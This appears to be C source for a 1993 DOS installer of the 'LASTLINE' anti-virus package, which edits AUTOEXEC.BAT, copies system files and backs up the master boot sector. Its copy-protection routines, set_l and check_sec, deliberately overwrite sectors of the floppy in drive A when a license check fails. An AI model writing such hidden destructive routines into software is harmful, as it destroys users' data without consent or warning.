#include <stdio.h>
#include "twindow.h"
#include "keys.h"
#include <string.h>
#include <dir.h>
#include <dos.h>
#include <io.h>
#include <stdlib.h>
#include <process.h>
#include <ctype.h>
void set_l(void);
void check_sec(void);
main()
{
   WINDOW *inf,*inff,*tit,*titt,*p,*pp;
   FILE *fp;
   int x,y,ii;
   char dospath[100],temp[100],doscen1[50],doscen2[50],k;
   set_l();
   check_sec();
   x=wherex();y=wherey();

   titt=establish_window(17,6,4,50);
   set_colors(titt,ALL,3,WHITE,BRIGHT);
   titt->wcolor[0]=0x33;
   set_border(titt,3);
   display_window(titt);

   tit=establish_window(15,5,4,50);
   set_colors(tit,ALL,BLUE,WHITE,BRIGHT);
   tit->wcolor[0]=0x11;
   set_border(tit,3);
   display_window(tit);
   wprintf(tit,"              LASTLINE Version 2.0\n          (C) Copyright ");
   wprintf(tit,"%c%c%c%c%c%c%c%c",87,65,78,71,81,85,65,78);
   wprintf(tit," 1993.");
   inff=establish_window(12,12,5,60);
   set_colors(inff,ALL,3,YELLOW,BRIGHT);
   inff->wcolor[0]=0x33;
   set_border(inff,3);
   display_window(inff);

   inf=establish_window(10,11,5,60);
   set_colors(inf,ALL,BLUE,YELLOW,BRIGHT);
   inf->wcolor[0]=0x11;
   set_border(inf,3);
   display_window(inf);
   pp=establish_window(12,19,3,60);
   set_colors(pp,ALL,3,WHITE,BRIGHT);
   pp->wcolor[0]=0x33;
   set_border(pp,3);
   p=establish_window(10,18,3,60);
   set_colors(p,ALL,BLUE,WHITE,BRIGHT);
   set_border(p,3);


  wprintf(inf,"   DOS path is    C:\\DOS , right?[Y]\b\b");
  k=getch();
  if((k==13) ||(toupper(k)=='Y'))
     strcpy(dospath,"c:\\dos");
  else
    {
      wprintf(inf,"N");
      wprintf(inf,"\n   Enter path including DOS,please :  ");
      scanf("%s",dospath);
    }
  wprintf(inf,"\n   DOS CENTER FILE are IO.SYS and MSDOS.SYS, right?[Y]\b\b");
  k=getch();
  if((k==13) ||(toupper(k)=='Y'))
     {
       strcpy(doscen1,"IO.SYS");
       strcpy(doscen2,"MSDOS.SYS");
     }
  else
    {
      wprintf(inf,"N");
      wprintf(inf,"\n   Enter DOS CENTER FILE NAME,please :  ");
      scanf("%s %s",doscen1,doscen2);
    }

  wprintf(inf,"\n   Auto start anti-virus software,ALWAYSEE ?[Y]\b\b");
  k=getch();
  if(toupper(k)=='N') wprintf(inf,"N\n");
  set_title(p,"Installing...");

   display_window(pp);

  display_window(p);
  if((fp=fopen("c:\\autoexec.bat","at"))==NULL)
     wprintf(inf,"Error open AUTOEXEC.BAT.");
  else
     if ((k==13) || (toupper(k)!='N'))
	fputs("c:\\lastline\\strchk1\n",fp);
     else
	fputs("c:\\lastline\\strchk2\n",fp);
  wputchar(p,219);wputchar(p,219);
  fclose(fp);

  wputchar(p,219);wputchar(p,219);wputchar(p,219);
  system("exit");system("copy a:mngrboot.exe  c:\\lastline>c:\\aaaaaa.aaa");
  wputchar(p,219);wputchar(p,219);wputchar(p,219);wputchar(p,219);
  wputchar(p,219);wputchar(p,219);wputchar(p,219);
  system("exit");system("copy a:fatrsave.exe  c:\\lastline>c:\\aaaaaa.aaa"); wputchar(p,219);
  wputchar(p,219);wputchar(p,219);wputchar(p,219);
  wputchar(p,219);wputchar(p,219);wputchar(p,219);
  system("exit");system("copy a:mkimg.com  c:\\lastline>c:\\aaaaaa.aaa");
  wputchar(p,219);wputchar(p,219);wputchar(p,219);
  system("exit");system("copy a:alwaysee.com  c:\\lastline>c:\\aaaaaa.aaa");
  wputchar(p,219);wputchar(p,219);wputchar(p,219);
  system("exit");system("copy a:strchk1.exe  c:\\lastline>c:\\aaaaaa.aaa");
  wputchar(p,219);wputchar(p,219);wputchar(p,219);
  system("exit");system("copy a:strchk2.exe  c:\\lastline>c:\\aaaaaa.aaa");
  wputchar(p,219);wputchar(p,219);wputchar(p,219);
  strcpy(temp,"c:\\lastline\\");
  strcat(temp,doscen1);
  _chmod(temp,1,FA_ARCH);
  wputchar(p,219);wputchar(p,219);
  strcpy(temp,"c:\\lastline\\");
  strcat(temp,doscen2);
  _chmod(temp,1,FA_ARCH);
  wputchar(p,219);wputchar(p,219);
  strcpy(temp,"c:\\");
  strcat(temp,doscen1);
  _chmod(temp,1,FA_ARCH);
  wputchar(p,219);wputchar(p,219);
  strcpy(temp,"c:\\");
  strcat(temp,doscen2);
  _chmod(temp,1,FA_ARCH);
  wputchar(p,219);wputchar(p,219);
  strcpy(temp,"copy c:\\");
  strcat(temp,doscen1);
  strcat(temp," c:\\lastline>c:\\aaaaaa.aaa");
  system("exit");system(temp);
  wputchar(p,219);wputchar(p,219);wputchar(p,219);
  wputchar(p,219);wputchar(p,219);
  strcpy(temp,"copy c:\\");
  strcat(temp,doscen2);
  strcat(temp," c:\\lastline>c:\\aaaaaa.aaa");
  system("exit");system(temp);
  wputchar(p,219);wputchar(p,219);wputchar(p,219);
  strcpy(temp,"c:\\");
  strcat(temp,doscen1);
  _chmod(temp,1,FA_RDONLY+FA_HIDDEN+FA_SYSTEM);
  wputchar(p,219);wputchar(p,219);
  strcpy(temp,"c:\\");
  strcat(temp,doscen2);
  _chmod(temp,1,FA_RDONLY+FA_HIDDEN+FA_SYSTEM);
  wputchar(p,219);wputchar(p,219);
  strcpy(temp,"c:\\lastline\\");
  strcat(temp,doscen1);
  _chmod(temp,1,FA_RDONLY+FA_HIDDEN+FA_SYSTEM);
  wputchar(p,219);wputchar(p,219);
  strcpy(temp,"c:\\lastline\\");
  strcat(temp,doscen2);
  _chmod(temp,1,FA_RDONLY+FA_HIDDEN+FA_SYSTEM);
  wputchar(p,219);wputchar(p,219);wputchar(p,219);wputchar(p,219);wputchar(p,219);
  system("exit");system("copy c:\\command.com c:\\lastline>c:\\aaaaaa.aaa");
  wputchar(p,219);wputchar(p,219);wputchar(p,219);
  strcpy(temp,"copy ");
  strcat(temp,dospath);
  strcat(temp,"\\sys.* c:\\lastline>c:\\aaaaaa.aaa");
  system("exit");
  system(temp);
  system("exit");system("del c:\\aaaaaa.aaa");
  wputchar(p,219);wputchar(p,219);wputchar(p,219);wputchar(p,219);wputchar(p,219);wputchar(p,219);
  close_all();
  gotoxy(x,y);
  }

void set_l(void)
  {
    int i;
    FILE *fp;
    char vol[501],voll[12]={0xa8,
	       0xae,0xb3,0xbe,0xac,0xab,0xb3,0xb6,0xd1,0xb1,0xba,0};
    struct ffblk fff,*pv;
    pv=&fff;
    findfirst("a:*.*",pv,FA_LABEL);
    strcpy(vol,pv->ff_name);
    for (i=0;i<11;i++)
      {
	vol[i]=~(vol[i]);
	if(vol[i]!=voll[i])
	 {
	   biosdisk(3,0,0,0,1,0xff,vol);
	   printf("\nUnlawful user or unlocking.\n");
	   exit(1);
	 }
      }
    if(biosdisk(2,0x80,0,0,1,1,vol))
      {
	biosdisk(0,0x80,0,0,0,0,0);
	printf("Error.\n");
	exit(1);
      }
    mkdir("c:\\lastline");
    _chmod("c:\\lastline\\lastline.cfg",1,FA_ARCH);
    if((fp=fopen("c:\\lastline\\lastline.cfg","wb+"))==NULL)
       printf("\nError.\n");
    for (i=0x1c3;i<0x1c6;i++)
      vol[i-0x1c3]=~(vol[i]);
    fwrite(vol,501,1,fp);
    fclose(fp);
    _chmod("c:\\lastline\\lastline.cfg",1,FA_RDONLY+FA_HIDDEN);
    }

void check_sec(void)
 {
   char boot[512],part[512];
   if(absread(0,1,0,boot))
     {
       biosdisk(0,0x80,0,0,0,0,0);
       printf("Error.\n");
       exit(1);
     }
   if(absread(0,1,2000,part))
     {
       biosdisk(0,0x80,0,0,0,0,0);
       printf("Error.\n");
       exit(1);
     }
   if(memcmp(boot,part,512))
    {
     biosdisk(3,0,0,0,1,0xff,boot+0x101);
     printf("\n\n\n\n\n\                  Unlawful user or unlocking.\n");
     exit(1);
    }
 }
